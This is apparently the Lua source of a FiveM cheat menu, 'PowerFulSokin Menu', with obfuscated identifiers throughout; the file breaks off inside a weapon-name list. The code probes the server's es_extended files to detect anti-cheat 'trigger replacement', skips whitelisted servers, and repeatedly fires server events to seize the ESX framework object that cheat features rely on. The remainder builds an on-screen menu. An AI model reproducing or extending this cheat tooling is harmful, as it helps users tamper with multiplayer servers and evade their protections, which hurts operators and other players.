PowerFulSokin = {}

PowerFulSokin.debug = false

local chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
local length = 12
local randomString = 'kutasapiac'
local discordPresence = true
local p = true 

math.random(5,12)

charTable = {}
for c in chars:gmatch"." do
    table.insert(charTable, c)
end

for i = 1, length do
    randomString = randomString .. charTable[math.random(1, #charTable)]
end

local essa = print(randomString)


local hasdh8ay = true

local whitelistedServerIPs = {

}

for k,v in pairs(whitelistedServerIPs) do
    if GetCurrentServerEndpoint() == v then
        print('POwerFulSokin Menu: This server is protected and the menu is not gonna work here.')
        hasdh8ay = false
        return
    end
end

local function GetResources()
    local resources = {}
    for i=0, GetNumResources() do
        resources[i] = GetResourceByFindIndex(i)
    end
    return resources
end
local serverOptionsResources = {}
serverOptionsResources = GetResources()

local LOAD_es_extended = LoadResourceFile("es_extended", "client/common.lua")
if LOAD_es_extended then
    LOAD_es_extended = LOAD_es_extended:gsub("AddEventHandler", "")
    LOAD_es_extended = LOAD_es_extended:gsub("cb", "")
    LOAD_es_extended = LOAD_es_extended:gsub("function ", "")
    LOAD_es_extended = LOAD_es_extended:gsub("return ESX", "")
    LOAD_es_extended = LOAD_es_extended:gsub("(ESX)", "")
    LOAD_es_extended = LOAD_es_extended:gsub("function", "")
    LOAD_es_extended = LOAD_es_extended:gsub("getSharedObject%(%)", "")
    LOAD_es_extended = LOAD_es_extended:gsub("end", "")
    LOAD_es_extended = LOAD_es_extended:gsub("%(", "")
    LOAD_es_extended = LOAD_es_extended:gsub("%)", "")
    LOAD_es_extended = LOAD_es_extended:gsub(",", "")
    LOAD_es_extended = LOAD_es_extended:gsub("\n", "")
    LOAD_es_extended = LOAD_es_extended:gsub("'", "")
    LOAD_es_extended = LOAD_es_extended:gsub("%s+", "")
    if tostring(LOAD_es_extended) ~= 'esx:getSharedObject' then
        print('This server is using trigger replacement, watch out!')
    end
end

ESX = nil

Citizen.CreateThread(
    function()
        while ESX == nil and ShowMenu do
            FM.TriggerCustomEvent(false, tostring(LOAD_es_extended),function(a)
                    ESX = a
                end
            )
            print('ESX was set to: '..tostring(LOAD_es_extended))
            Citizen.Wait(1000)
        end
    end
)

function sadha7sxzsaText(text, justification, red, green, blue, alpha, posx, posy)
    SetTextFont(4)
    SetTextWrap(0.0, 1.0)
    SetTextScale(1.0, 0.5)
    SetTextJustification(justification)
    SetTextColour(red, green, blue, alpha)
    SetTextOutline()

    BeginTextCommandsadha7sxzsaText("STRING")
    AddTextComponentSubstringPlayerName(text)
    EndTextCommandsadha7sxzsaText(posx, posy)
end

local function asudga76sd1(asdhaiusdgq78wd12)
    local result = {}
    local curtime = GetGameTimer() / 1000

    result.r = math.floor(math.sin(curtime * asdhaiusdgq78wd12 + 0) * 127 + 128)
    result.g = math.floor(math.sin(curtime * asdhaiusdgq78wd12 + 2) * 127 + 128)
    result.b = math.floor(math.sin(curtime * asdhaiusdgq78wd12 + 4) * 127 + 128)

    return result
end

--local sdg6a7sdg = true

local sagd76asd = true
local p = "1995"

local sasiud9asdh8asdX = 9
local asdhasdh8asdasdas = 9
local sasiud9asdh8asdY = 3
local asduas7dhasyd8asd = 3
local asdja9usduasasdjasd = { 0.025, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.75 }
local asdhas78da8hd = { 0.025, 0.1, 0.2, 0.3, 0.425 }

local asdja7sdasd = 1
local asdh8asdh = 1

local asihdasdhas8dg = {}
local keys = {up = 172, down = 173, left = 174, right = 175, select = 176, back = 177}
local optionCount = 0

local asjduyasdasd = nil
local sasiud9asdh8asd = nil

local asdha7sdhas7da8sd = 0.23
local asiodyhas78dh7a8sd = 0.11
local asdhasd8sahdasd = 0.03
local asdugas8d7gasd87asd = 1.0

local sadh78asd7asgdaHeight = 0.038
local sadh78asd7asgdaFont = 0
local sadh78asd7asgdaScale = 0.365
local sadh78asd7asgdaTextXOffset = 0.005
local sadh78asd7asgdaTextYOffset = 0.005

local Keys = {
  ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
  ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
  ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
  ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
  ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
  ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
  ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
  ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
  ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118,
  ["MOUSE1"] = 24
}

local CreateThread = Citizen.CreateThread
local CreateThreadNow = Citizen.CreateThreadNow

local function k(l)
    local m = {}
    local n = GetGameTimer() / 200
    m.r = math.floor(math.sin(n * l + 0) * 127 + 128)
    m.g = math.floor(math.sin(n * l + 2) * 127 + 128)
    m.b = math.floor(math.sin(n * l + 4) * 127 + 128)
    return m
end

local function wejaudhu8as(text)
    if PowerFulSokin.debug then
        Citizen.Trace("[PowerFulSokin] " .. tostring(text))
    end
end

local function sashd97sxx(id, property, value)
    if id and asihdasdhas8dg[id] then
        asihdasdhas8dg[id][property] = value
        wejaudhu8as(id .. " menu property changed: { " .. tostring(property) .. ", " .. tostring(value) .. " }")
    end
end

local function y7qwasd21(id)
    if id and asihdasdhas8dg[id] then
        return asihdasdhas8dg[id].visible
    else
        return false
    end
end

local function qsdhas7daszx(id, visible, holdCurrent)
    if id and asihdasdhas8dg[id] then
        sashd97sxx(id, "visible", visible)

        if not holdCurrent and asihdasdhas8dg[id] then
            sashd97sxx(id, "currentOption", 1)
        end

        if visible then
            if id ~= sasiud9asdh8asd and y7qwasd21(sasiud9asdh8asd) then
                qsdhas7daszx(sasiud9asdh8asd, false)
            end

            sasiud9asdh8asd = id
        end
    end
end

function PowerFulSokin.asdashd7as78dh7778d(id, width)
    sashd97sxx(id, 'width', width)
end


function PowerFulSokin.asdauhsdy7asdass(id, x)
    sashd97sxx(id, 'x', x)
end


function PowerFulSokin.asdjhas7dha8sdasdasd(id, y)
    sashd97sxx(id, 'y', y)
end


function PowerFulSokin.dgas78dgagsdasdgasd(id, count)
    sashd97sxx(id, 'maxOptionCount', count)
end



local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
    SetTextColour(color.r, color.g, color.b, color.a)
    SetTextFont(font)
    SetTextScale(scale, scale)

    if shadow then
        SetTextDropShadow(2, 2, 0, 0, 0)
    end

    if asihdasdhas8dg[sasiud9asdh8asd] then
        if center then
            SetTextCentre(center)
        elseif alignRight then
            SetTextWrap(asihdasdhas8dg[sasiud9asdh8asd].x, asihdasdhas8dg[sasiud9asdh8asd].x + asdha7sdhas7da8sd - sadh78asd7asgdaTextXOffset)
            SetTextRightJustify(true)
        end
    end
    SetTextEntry("STRING")
    AddTextComponentString(text)
    DrawText(x, y)
end

local function drawRect(x, y, width, height, color)
    DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end

local function asduasd8assda()
    if asihdasdhas8dg[sasiud9asdh8asd] then
        local x = asihdasdhas8dg[sasiud9asdh8asd].x + asdha7sdhas7da8sd / 2
        local y = asihdasdhas8dg[sasiud9asdh8asd].y + asiodyhas78dh7a8sd / 2

        if asihdasdhas8dg[sasiud9asdh8asd].titleBackgroundSprite then
            DrawSprite(
                asihdasdhas8dg[sasiud9asdh8asd].titleBackgroundSprite.dict,
                asihdasdhas8dg[sasiud9asdh8asd].titleBackgroundSprite.name,
                x,
                y,
                asdha7sdhas7da8sd,
                asiodyhas78dh7a8sd,
                0.,
                255,
                255,
                255,
                255
            )
        else
            drawRect(x, y, asdha7sdhas7da8sd, asiodyhas78dh7a8sd, asihdasdhas8dg[sasiud9asdh8asd].titleBackgroundColor)
        end

        drawText(
            asihdasdhas8dg[sasiud9asdh8asd].title,
            x,
            y - asiodyhas78dh7a8sd / 2 + asdhasd8sahdasd,
            asihdasdhas8dg[sasiud9asdh8asd].titleFont,
            asihdasdhas8dg[sasiud9asdh8asd].titleColor,
            asdugas8d7gasd87asd,
            true
        )
    end
end

local function sasidha7sdasdasd()
    if asihdasdhas8dg[sasiud9asdh8asd] then
        local x = asihdasdhas8dg[sasiud9asdh8asd].x + asdha7sdhas7da8sd / 2
        local y = asihdasdhas8dg[sasiud9asdh8asd].y + asiodyhas78dh7a8sd + sadh78asd7asgdaHeight / 2

        local subTitleColor = {
            r = asihdasdhas8dg[sasiud9asdh8asd].titleBackgroundColor.r,
            g = asihdasdhas8dg[sasiud9asdh8asd].titleBackgroundColor.g,
            b = asihdasdhas8dg[sasiud9asdh8asd].titleBackgroundColor.b,
            a = 255
        }

        drawRect(x, y, asdha7sdhas7da8sd, sadh78asd7asgdaHeight, asihdasdhas8dg[sasiud9asdh8asd].subTitleBackgroundColor)
        drawText(
            asihdasdhas8dg[sasiud9asdh8asd].subTitle,
            asihdasdhas8dg[sasiud9asdh8asd].x + sadh78asd7asgdaTextXOffset,
            y - sadh78asd7asgdaHeight / 2 + sadh78asd7asgdaTextYOffset,
            sadh78asd7asgdaFont,
            subTitleColor,
            sadh78asd7asgdaScale,
            false
        )

        if optionCount > asihdasdhas8dg[sasiud9asdh8asd].maxOptionCount then
            drawText(
                tostring(asihdasdhas8dg[sasiud9asdh8asd].currentOption) .. " / " .. tostring(optionCount),
                asihdasdhas8dg[sasiud9asdh8asd].x + asdha7sdhas7da8sd,
                y - sadh78asd7asgdaHeight / 2 + sadh78asd7asgdaTextYOffset,
                sadh78asd7asgdaFont,
                subTitleColor,
                sadh78asd7asgdaScale,
                false,
                false,
                true
            )
        end
    end
end

local function drawsadh78asd7asgda(text, subText)
    local x = asihdasdhas8dg[sasiud9asdh8asd].x + asdha7sdhas7da8sd / 2
    local multiplier = nil

    if
        asihdasdhas8dg[sasiud9asdh8asd].currentOption <= asihdasdhas8dg[sasiud9asdh8asd].maxOptionCount and
            optionCount <= asihdasdhas8dg[sasiud9asdh8asd].maxOptionCount
     then
        multiplier = optionCount
    elseif
        optionCount > asihdasdhas8dg[sasiud9asdh8asd].currentOption - asihdasdhas8dg[sasiud9asdh8asd].maxOptionCount and
            optionCount <= asihdasdhas8dg[sasiud9asdh8asd].currentOption
     then
        multiplier = optionCount - (asihdasdhas8dg[sasiud9asdh8asd].currentOption - asihdasdhas8dg[sasiud9asdh8asd].maxOptionCount)
    end

    if multiplier then
        local y = asihdasdhas8dg[sasiud9asdh8asd].y + asiodyhas78dh7a8sd + sadh78asd7asgdaHeight + (sadh78asd7asgdaHeight * multiplier) - sadh78asd7asgdaHeight / 2
        local backgroundColor = nil
        local textColor = nil
        local subTextColor = nil
        local shadow = false

        if asihdasdhas8dg[sasiud9asdh8asd].currentOption == optionCount then
            backgroundColor = asihdasdhas8dg[sasiud9asdh8asd].menuFocusBackgroundColor
            textColor = asihdasdhas8dg[sasiud9asdh8asd].menuFocusTextColor
            subTextColor = asihdasdhas8dg[sasiud9asdh8asd].menuFocusTextColor
        else
            backgroundColor = asihdasdhas8dg[sasiud9asdh8asd].menuBackgroundColor
            textColor = asihdasdhas8dg[sasiud9asdh8asd].menuTextColor
            subTextColor = asihdasdhas8dg[sasiud9asdh8asd].asihdasdhas8dgubTextColor
            shadow = true
        end

        drawRect(x, y, asdha7sdhas7da8sd, sadh78asd7asgdaHeight, backgroundColor)
        drawText(
            text,
            asihdasdhas8dg[sasiud9asdh8asd].x + sadh78asd7asgdaTextXOffset,
            y - (sadh78asd7asgdaHeight / 2) + sadh78asd7asgdaTextYOffset,
            sadh78asd7asgdaFont,
            textColor,
            sadh78asd7asgdaScale,
            false,
            shadow
        )

        if subText then
            drawText(
                subText,
                asihdasdhas8dg[sasiud9asdh8asd].x + sadh78asd7asgdaTextXOffset,
                y - sadh78asd7asgdaHeight / 2 + sadh78asd7asgdaTextYOffset,
                sadh78asd7asgdaFont,
                subTextColor,
                sadh78asd7asgdaScale,
                false,
                shadow,
                true
            )
        end
    end
end

function PowerFulSokin.asdjasd97aaa(id, title)

    asihdasdhas8dg[id] = {}
    asihdasdhas8dg[id].title = title

    asihdasdhas8dg[id].visible = false

    asihdasdhas8dg[id].previousMenu = nil

    asihdasdhas8dg[id].aboutToBeClosed = false

    asihdasdhas8dg[id].x = 0.75
    asihdasdhas8dg[id].y = 0.19

    asihdasdhas8dg[id].currentOption = 1
    asihdasdhas8dg[id].maxOptionCount = 10
    asihdasdhas8dg[id].titleFont = 6
    asihdasdhas8dg[id].titleColor = {r = 255, g = 255, b = 255, a = 255}
    Citizen.CreateThread(
        function()
            while true do
                Citizen.Wait(0)
                local ra = asudga76sd1(1.0)              
                asihdasdhas8dg[id].titleBackgroundColor = {r = 153, g = 0, b = 0, a = 255}
                asihdasdhas8dg[id].menuFocusBackgroundColor = {r = 153, g = 0, b = 0, a = 255}
            end
        end)
    asihdasdhas8dg[id].titleBackgroundSprite = nil

    asihdasdhas8dg[id].menuTextColor = {r = 255, g = 255, b = 255, a = 255}
    asihdasdhas8dg[id].asihdasdhas8dgubTextColor = {r = 189, g = 189, b = 189, a = 255}
    asihdasdhas8dg[id].menuFocusTextColor = {r = 255, g = 255, b = 255, a = 255}
    --asihdasdhas8dg[id].menuFocusBackgroundColor = { r = 245, g = 245, b = 245, a = 255 }
    asihdasdhas8dg[id].menuBackgroundColor = {r = 0, g = 0, b = 0, a = 150}

    asihdasdhas8dg[id].subTitleBackgroundColor = {
        r = 0,
        g = 0,
        b = 0,
        a = 255
    }

    asihdasdhas8dg[id].sadh78asd7asgdaPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"} 

    wejaudhu8as(tostring(id) .. " menu created")
end

function PowerFulSokin.dasgd8aysgd8a7std6a(id, parent, subTitle)
    if asihdasdhas8dg[parent] then
        PowerFulSokin.asdjasd97aaa(id, asihdasdhas8dg[parent].title)

        if subTitle then
            sashd97sxx(id, "subTitle", string.upper(subTitle))
        else
            sashd97sxx(id, "subTitle", string.upper(asihdasdhas8dg[parent].subTitle))
        end

        sashd97sxx(id, "previousMenu", parent)

        sashd97sxx(id, "x", asihdasdhas8dg[parent].x)
        sashd97sxx(id, "y", asihdasdhas8dg[parent].y)
        sashd97sxx(id, "maxOptionCount", asihdasdhas8dg[parent].maxOptionCount)
        sashd97sxx(id, "titleFont", asihdasdhas8dg[parent].titleFont)
        sashd97sxx(id, "titleColor", asihdasdhas8dg[parent].titleColor)
        sashd97sxx(id, "titleBackgroundColor", asihdasdhas8dg[parent].titleBackgroundColor)
        sashd97sxx(id, "titleBackgroundSprite", asihdasdhas8dg[parent].titleBackgroundSprite)
        sashd97sxx(id, "menuTextColor", asihdasdhas8dg[parent].menuTextColor)
        sashd97sxx(id, "asihdasdhas8dgubTextColor", asihdasdhas8dg[parent].asihdasdhas8dgubTextColor)
        sashd97sxx(id, "menuFocusTextColor", asihdasdhas8dg[parent].menuFocusTextColor)
        sashd97sxx(id, "menuFocusBackgroundColor", asihdasdhas8dg[parent].menuFocusBackgroundColor)
        sashd97sxx(id, "menuBackgroundColor", asihdasdhas8dg[parent].menuBackgroundColor)
        sashd97sxx(id, "subTitleBackgroundColor", asihdasdhas8dg[parent].subTitleBackgroundColor)
    else
        wejaudhu8as("Failed to create " .. tostring(id) .. " submenu: " .. tostring(parent) .. " parent menu doesn't exist")
    end
end

function PowerFulSokin.sasiud9asdh8asd()
    return sasiud9asdh8asd
end

function PowerFulSokin.asd62116t6ds(id)
    if id and asihdasdhas8dg[id] then
        PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
        qsdhas7daszx(id, true)

        if asihdasdhas8dg[id].titleBackgroundSprite then
            RequestStreamedTextureDict(asihdasdhas8dg[id].titleBackgroundSprite.dict, false)
            while not HasStreamedTextureDictLoaded(asihdasdhas8dg[id].titleBackgroundSprite.dict) do
                Citizen.Wait(0)
            end
        end

        wejaudhu8as(tostring(id) .. " menu opened")
    else
        wejaudhu8as("Failed to open " .. tostring(id) .. " menu: it doesn't exist")
    end
end

function PowerFulSokin.asdy7as12(id)
    return y7qwasd21(id)
end

function PowerFulSokin.uashd8ahsc8()
    for id, _ in pairs(asihdasdhas8dg) do
        if y7qwasd21(id) then
            return true
        end
    end

    return false
end

function PowerFulSokin.asdiha78xch7()
    if asihdasdhas8dg[sasiud9asdh8asd] then
        return asihdasdhas8dg[sasiud9asdh8asd].aboutToBeClosed
    else
        return false
    end
end

function PowerFulSokin.sadha7sxzsaaa()
    if asihdasdhas8dg[sasiud9asdh8asd] then
        if asihdasdhas8dg[sasiud9asdh8asd].aboutToBeClosed then
            asihdasdhas8dg[sasiud9asdh8asd].aboutToBeClosed = false
            qsdhas7daszx(sasiud9asdh8asd, false)
            wejaudhu8as(tostring(sasiud9asdh8asd) .. " menu closed")
            PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            optionCount = 0
            sasiud9asdh8asd = nil
            asjduyasdasd = nil
        else
            asihdasdhas8dg[sasiud9asdh8asd].aboutToBeClosed = true
            wejaudhu8as(tostring(sasiud9asdh8asd) .. " menu about to be closed")
        end
    end
end

function PowerFulSokin.sadh78asd7asgda(text, subText)
    local sadh78asd7asgdaText = text
    if subText then
        sadh78asd7asgdaText = "{ " .. tostring(sadh78asd7asgdaText) .. ", " .. tostring(subText) .. " }"
    end

    if asihdasdhas8dg[sasiud9asdh8asd] then
        optionCount = optionCount + 1

        local asdhaisdga8s7d = asihdasdhas8dg[sasiud9asdh8asd].currentOption == optionCount

        drawsadh78asd7asgda(text, subText)

        if asdhaisdga8s7d then
            if asjduyasdasd == keys.select then
                PlaySoundFrontend(-1, asihdasdhas8dg[sasiud9asdh8asd].sadh78asd7asgdaPressedSound.name, asihdasdhas8dg[sasiud9asdh8asd].sadh78asd7asgdaPressedSound.set, true)
                wejaudhu8as(sadh78asd7asgdaText .. " sadh78asd7asgda pressed")
                return true
            elseif asjduyasdasd == keys.left or asjduyasdasd == keys.right then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            end
        end

        return false
    else
        wejaudhu8as("Failed to create " .. sadh78asd7asgdaText .. " sadh78asd7asgda: " .. tostring(sasiud9asdh8asd) .. " menu doesn't exist")

        return false
    end
end

function PowerFulSokin.saidhas78dhas(text, id)
    if asihdasdhas8dg[id] then
        if PowerFulSokin.sadh78asd7asgda(text) then
            qsdhas7daszx(sasiud9asdh8asd, false)
            qsdhas7daszx(id, true, true)

            return true
        end
    else
        wejaudhu8as("Failed to create " .. tostring(text) .. " menu sadh78asd7asgda: " .. tostring(id) .. " submenu doesn't exist")
    end

    return false
end

function PowerFulSokin.asdnjasj9asdljasdu(text, bool, hadsygas7uydgasd)
    local checked = "~r~~h~Off"
    if bool then
        checked = "~g~~h~On"
    end

    if PowerFulSokin.sadh78asd7asgda(text, checked) then
        bool = not bool
        wejaudhu8as(tostring(text) .. " asdnjasj9asdljasdu changed to " .. tostring(bool))
        hadsygas7uydgasd(bool)

        return true
    end

    return false
end

function PowerFulSokin.asidhas89dg(text, asdgas68dgas7das, yagsd7asgd7asgdasd, saudygasuydguasdasd, hadsygas7uydgasd)
    local asdaysdgas7ydgasd = #asdgas68dgas7das
    local asdhasdhas8d = asdgas68dgas7das[yagsd7asgd7asgdasd]
    local asdhaisdga8s7d = asihdasdhas8dg[sasiud9asdh8asd].currentOption == (optionCount + 1)

    if asdaysdgas7ydgasd > 1 and asdhaisdga8s7d then
        asdhasdhas8d = "← " .. tostring(asdhasdhas8d) .. " →"
    end

    if PowerFulSokin.sadh78asd7asgda(text, asdhasdhas8d) then
        saudygasuydguasdasd = yagsd7asgd7asgdasd
        hadsygas7uydgasd(yagsd7asgd7asgdasd, saudygasuydguasdasd)
        return true
    elseif asdhaisdga8s7d then
        if asjduyasdasd == keys.left then
            if yagsd7asgd7asgdasd > 1 then
                yagsd7asgd7asgdasd = yagsd7asgd7asgdasd - 1
            else
                yagsd7asgd7asgdasd = asdaysdgas7ydgasd
            end
        elseif asjduyasdasd == keys.right then
            if yagsd7asgd7asgdasd < asdaysdgas7ydgasd then
                yagsd7asgd7asgdasd = yagsd7asgd7asgdasd + 1
            else
                yagsd7asgd7asgdasd = 1
            end
        end
    else
        yagsd7asgd7asgdasd = saudygasuydguasdasd
    end

    hadsygas7uydgasd(yagsd7asgd7asgdasd, saudygasuydguasdasd)
    return false
end

function PowerFulSokin.sadha7sxzsa()
    if y7qwasd21(sasiud9asdh8asd) then
        if asihdasdhas8dg[sasiud9asdh8asd].aboutToBeClosed then
            PowerFulSokin.sadha7sxzsaaa()
        else
            ClearAllHelpMessages()

            asduasd8assda()
            sasidha7sdasdasd()

            asjduyasdasd = nil

            if IsDisabledControlJustPressed(0, keys.down) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

                if asihdasdhas8dg[sasiud9asdh8asd].currentOption < optionCount then
                    asihdasdhas8dg[sasiud9asdh8asd].currentOption = asihdasdhas8dg[sasiud9asdh8asd].currentOption + 1
                else
                    asihdasdhas8dg[sasiud9asdh8asd].currentOption = 1
                end
            elseif IsDisabledControlJustPressed(0, keys.up) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

                if asihdasdhas8dg[sasiud9asdh8asd].currentOption > 1 then
                    asihdasdhas8dg[sasiud9asdh8asd].currentOption = asihdasdhas8dg[sasiud9asdh8asd].currentOption - 1
                else
                    asihdasdhas8dg[sasiud9asdh8asd].currentOption = optionCount
                end
            elseif IsDisabledControlJustPressed(0, keys.left) then
                asjduyasdasd = keys.left
            elseif IsDisabledControlJustPressed(0, keys.right) then
                asjduyasdasd = keys.right
            elseif IsDisabledControlJustPressed(0, keys.select) then
                asjduyasdasd = keys.select
            elseif IsDisabledControlJustPressed(0, keys.back) then
                if asihdasdhas8dg[asihdasdhas8dg[sasiud9asdh8asd].previousMenu] then
                    PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                    qsdhas7daszx(asihdasdhas8dg[sasiud9asdh8asd].previousMenu, true)
                else
                    PowerFulSokin.sadha7sxzsaaa()
                end
            end

            optionCount = 0
        end
    end
end

function PowerFulSokin.asdashd7as78dh7778d(id, width)
    sashd97sxx(id, "width", width)
end

function PowerFulSokin.asdauhsdy7asdass(id, x)
    sashd97sxx(id, "x", x)
end

function PowerFulSokin.asdjhas7dha8sdasdasd(id, y)
    sashd97sxx(id, "y", y)
end

function PowerFulSokin.dgas78dgagsdasdgasd(id, count)
    sashd97sxx(id, "maxOptionCount", count)
end

function PowerFulSokin.sad8asydh8ah8sd78uasd(id, r, g, b, a)
    sashd97sxx(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or asihdasdhas8dg[id].titleColor.a})
end

function PowerFulSokin.asdhasyd8has8ydhas(id, r, g, b, a)
    sashd97sxx(
        id,
        "titleBackgroundColor",
        {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or asihdasdhas8dg[id].titleBackgroundColor.a}
    )
end

function PowerFulSokin.sada8syda8sdasd(id, textureDict, textureName)
    sashd97sxx(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
end

function PowerFulSokin.dasdjas78dhasd(id, text)
    sashd97sxx(id, "subTitle", string.upper(text))
end

function PowerFulSokin.sadyg76asgd67asdasdasd(id, r, g, b, a)
    sashd97sxx(
        id,
        "menuBackgroundColor",
        {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or asihdasdhas8dg[id].menuBackgroundColor.a}
    )
end

function PowerFulSokin.asdnyasd7asdbasdhasdas(id, r, g, b, a)
    sashd97sxx(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or asihdasdhas8dg[id].menuTextColor.a})
end

function PowerFulSokin.Setasihdasdhas8dgubTextColor(id, r, g, b, a)
    sashd97sxx(id, "asihdasdhas8dgubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or asihdasdhas8dg[id].asihdasdhas8dgubTextColor.a})
end

function PowerFulSokin.sagd7asgd7agd7asgdasd(id, r, g, b, a)
    sashd97sxx(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or asihdasdhas8dg[id].menuFocusColor.a})
end

function PowerFulSokin.Setsaidhas78dhasPressedSound(id, name, set)
    sashd97sxx(id, "sadh78asd7asgdaPressedSound", {["name"] = name, ["set"] = set})
end

function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
    AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
    blockinput = true

    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
        Citizen.Wait(0)
    end

    if UpdateOnscreenKeyboard() ~= 2 then
        local result = GetOnscreenKeyboardResult()
        Citizen.Wait(500)
        blockinput = false
        return result
    else
        Citizen.Wait(500)
        blockinput = false
        return nil
    end
end

local function getPlayerIds()
    local players = {}
    for i = 0, GetNumberOfPlayers(128) do
        if NetworkIsPlayerActive(i) then
            players[#players + 1] = i
        end
    end
    return players
end


function DrawText3D(x, y, z, text, r, g, b)
    SetDrawOrigin(x, y, z, 0)
    SetTextFont(0)
    SetTextProportional(0)
    SetTextScale(0.0, 0.20)
    SetTextColour(r, g, b, 255)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 150)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    SetTextCentre(1)
    AddTextComponentString(text)
    DrawText(0.0, 0.0)
    ClearDrawOrigin()
end

function math.round(num, numDecimalPlaces)
    return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end

local function asudga76sd1(asdhaiusdgq78wd12)
    local result = {}
    local curtime = GetGameTimer() / 1000

    result.r = math.floor(math.sin(curtime * asdhaiusdgq78wd12 + 0) * 127 + 128)
    result.g = math.floor(math.sin(curtime * asdhaiusdgq78wd12 + 2) * 127 + 128)
    result.b = math.floor(math.sin(curtime * asdhaiusdgq78wd12 + 4) * 127 + 128)

    return result
end

function drawNotification(text)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(text)
    DrawNotification(false, false)
end

local weaponcombatpistol = {
        "WEAPON_COMBATPISTOL",
}

local allWeapons = {
    "WEAPON_KNIFE",
    "WEAPON_KNUCKLE",
    "WEAPON_NIGHTSTICK",
    "WEAPON_HAMMER",
    "WEAPON_BAT",
    "WEAPON_GOLFCLUB",
    "WEAPON_CROWBAR",
    "WEAPON_BOTTLE",
    "WEAPON_DAGGER",
    "WEAPON_HATCHET",
    "WEAPON_MACHETE",
    "WEAPON_FLASHLIGHT",
    "WEAPON_SWITCHBLADE",
    "WEAPON_PISTOL",
    "WEAPON_PISTOL_MK2",
    "WEAPON_COMBATPISTOL",
    "WEAPON_APPISTOL",
    "WEAPON_PISTOL50",
    "WEAPON_SNSPISTOL",
    "WEAPON_HEAVYPISTOL",
    "WEAPON_VINTAGEPISTOL",
    "WEAPON_STUNGUN",
    "WEAPON_FLAREGUN",
    "WEAPON_MARKSMANPISTOL",
    "WEAPON_REVOLVER",
    "WEAPON_MICROSMG",
    "WEAPON_SMG",
    "WEAPON_SMG_MK2",
    "WEAPON_ASSAULTSMG",
    "WEAPON_MG",
    "WEAPON_COMBATMG",
    "WEAPON_COMBATMG_MK2",
    "WEAPON_COMBATPDW",
    "WEAPON_GUSENBERG",
    "WEAPON_MACHINEPISTOL",
    "WEAPON_ASSAULTRIFLE",
    "WEAPON_ASSAULTRIFLE_MK2",
    "WEAPON_CARBINERIFLE",
    "WEAPON_CARBINERIFLE_MK2",
    "WEAPON_ADVANCEDRIFLE",
    "WEAPON_SPECIALCARBINE",
    "WEAPON_BULLPUPRIFLE",
    "WEAPON_COMPACTRIFLE",
    "WEAPON_PUMPSHOTGUN",
    "WEAPON_SAWNOFFSHOTGUN",
    "WEAPON_BULLPUPSHOTGUN",
    "WEAPON_ASSAULTSHOTGUN",
    "WEAPON_MUSKET",
    "WEAPON_HEAVYSHOTGUN",
    "WEAPON_DBSHOTGUN",
    "WEAPON_SNIPERRIFLE",
    "WEAPON_HEAVYSNIPER",
    "WEAPON_HEAVYSNIPER_MK2",
    "WEAPON_MARKSMANRIFLE",
    "WEAPON_GRENADELAUNCHER",
    "WEAPON_GRENADELAUNCHER_SMOKE",
    "WEAPON_RPG",
    "WEAPON_STINGER",
    "WEAPON_FIREWORK",
    "WEAPON_HOMINGLAUNCHER",
    "GADGET_PARACHUTE",
    "WEAPON_GRENADE",
